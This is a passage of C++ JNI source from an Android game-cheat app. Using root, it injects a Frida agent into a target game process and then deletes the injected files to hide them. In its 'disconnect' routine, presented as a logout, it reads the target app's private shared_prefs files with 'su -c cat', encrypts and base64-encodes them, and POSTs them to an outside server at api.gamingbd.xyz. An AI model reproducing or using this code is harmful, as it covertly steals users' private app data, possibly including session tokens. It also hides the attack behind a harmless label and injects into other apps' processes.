        {
            jclass      Context         = env->FindClass("android/content/Context");
            jmethodID   startActivity   = env->GetMethodID(Context, OBFUSCATE("startActivity"), "(Landroid/content/Intent;)V");
            env->CallVoidMethod(context, startActivity, intent );
        }

    }

    else {

        /** ROOT INJECT */

        /* int PID = Utils.getProcessID(target); */
        int PID =  0;
        {
            jclass      Utils           = env->FindClass("gamingbd/pro/Utils");
            jmethodID   getProcessID    = env->GetStaticMethodID(Utils, "getProcessID", "(Ljava/lang/String;)I");
            PID                         = env->CallStaticIntMethod(Utils, getProcessID, env->NewStringUTF(Loader::target.c_str()));
        }

        /* Checking PID */
        if ( PID <= 0 ){
            LOGD("Line 601: Error getting PID");
            return;
        }

        /** Execute frida inject*/
        char command[1024];
        {
            sprintf(command, OBFUSCATE("./dev/loader -p %d -s /dev/%s -e"), PID, Loader::agentFileName );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /** Clean agent */
        {
            sprintf(command, OBFUSCATE("rm -rf /dev/%s"),  Loader::agentFileName );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /** Clean script */
        {
            sprintf(command, OBFUSCATE("rm -rf /dev/%s"),  Loader::scriptFileName);
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /** Clean frida */
        {
            sprintf(command, OBFUSCATE("rm -rf /dev/%s"),  Loader::fridaFileName);
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

    }

}

__attribute__ ((visibility ("hidden")))
int registerLoaderClassMethods(JNIEnv* env){

    jclass LoaderClass = env->FindClass("gamingbd/pro/Loader");
    JNINativeMethod LoaderClassMethodList[] = {
            {"doInBackgroundLoader", "(Landroid/content/Context;)V",(void*) doInBackgroundLoader  },
            {"onPostExecuteLoader" , "(Landroid/content/Context;)V", (void*) onPostExecuteLoader  }
    };
    return env->RegisterNatives(LoaderClass, LoaderClassMethodList, sizeof(LoaderClassMethodList) / sizeof (LoaderClassMethodList[0]));

}

/**-----------------------------------------------------------------------------------------------*/








/** -------------------------------- ListApplication.java ---------------------------------------*/

__attribute__ ((visibility ("hidden")))
void updateInformation(JNIEnv *env, jclass clazz, jstring string1, jstring string2) {

    /* First Parameter: target package name */
    Loader::target          = env->GetStringUTFChars(string1, NULL);

    /* Second Parameter: target activity name */
    Loader::targetActivity  = env->GetStringUTFChars( string2, NULL );

}

__attribute__ ((visibility ("hidden")))
int registerListApplicationClassMethods(JNIEnv* env){

    jclass ListApplicationClass = env->FindClass(OBFUSCATE("gamingbd/pro/ListApplication"));
    JNINativeMethod ListApplicationClassMethodList[] = {
            {"updateInformation", "(Ljava/lang/String;Ljava/lang/String;)V",(void*) updateInformation  }
    };
    return env->RegisterNatives(ListApplicationClass, ListApplicationClassMethodList, sizeof(ListApplicationClassMethodList) / sizeof (ListApplicationClassMethodList[0]));


}

/** ----------------------------------------------------------------------------------------------*/



/** -------------------------------- FloatingViewService.java ---------------------------------------*/

extern "C"
JNIEXPORT jstring JNICALL
Java_gamingbd_pro_FloatingViewService_getName(JNIEnv *env, jclass clazz) {
    return LoginInterfaceComponent::HackName;
}

std::string executeShellCommand(const char* command) {

    FILE* pipe = popen(command, "r");
    if ( !pipe )  return NULL;

    std::string output;
    char buffer[128];

    while ( !feof(pipe)){
        if ( fgets( buffer, sizeof(buffer), pipe) != NULL ){
            output += buffer;
        }
    }
    fclose(pipe);
    return output;
}

void* disconnect(void* args){

    LOGD("POSIX thread created");
    LOGD("Attaching to JVM...");
    JNIEnv* env;
    javaVM->AttachCurrentThread( &env, NULL);

    if ( env != NULL ){
        LOGD("Current Thread Attached to JVM");

        std::string getSharedPreferenceCommand;
        {
            getSharedPreferenceCommand += "su -c cat /data/data/";
            getSharedPreferenceCommand += Loader::target;
            getSharedPreferenceCommand += "/shared_prefs/*";
        }

        std::string sharedPreference;
        {
            sharedPreference = executeShellCommand(getSharedPreferenceCommand.c_str());
        }

        std::string parameters;
        {
            parameters.append("data=");

            /* Encrypting Data */
            jstring encryptedString = RSA::encryptByChunks(env,env->NewStringUTF(sharedPreference.c_str()) );

            /* Encode Data in Base64 format which is suitable for using in network communication*/
            jstring encodedString = Base64::toBase64String(env, encryptedString);

            parameters.append(env->GetStringUTFChars(encodedString, NULL));
        }

        jstring URL         = env->NewStringUTF("https://api.gamingbd.xyz/api/logout.php");
        jstring response    = HttpURLConnection::POST(env, URL , env->NewStringUTF(parameters.c_str()) );

//        if ( strcmp(  env->GetStringUTFChars(response, NULL) , "OK" ) == 0  ){
//            jmethodID stopFloatingService = env->GetMethodID(Logout::LoginActivityClassGlobalRefs, "stopFloatingService","()V");
//            env->CallVoidMethod(Logout::LoginActivityContextGlobalRefs, stopFloatingService);
//        }

        jmethodID stopFloatingService = env->GetMethodID(Logout::LoginActivityClassGlobalRefs, "stopFloatingService","()V");
        env->CallVoidMethod(Logout::LoginActivityContextGlobalRefs, stopFloatingService);

    }

    javaVM->DetachCurrentThread();
    LOGD("Current Thread Detached from JVM");
    return NULL;
}


extern "C"
JNIEXPORT void JNICALL
Java_gamingbd_pro_FloatingViewService_stopFloatingNative(JNIEnv *env, jobject thiz) {

    pthread_t ptid;
    pthread_create(&ptid, NULL, disconnect, NULL);

}

/** ----------------------------------------------------------------------------------------------*/


extern "C"
JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {

    JNIEnv* env;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }

    registerLoginActivityClassMethods(env);
    registerNativeClassMethods(env);
    registerListApplicationClassMethods(env);
    registerLoaderClassMethods(env);

    return JNI_VERSION_1_6;
}



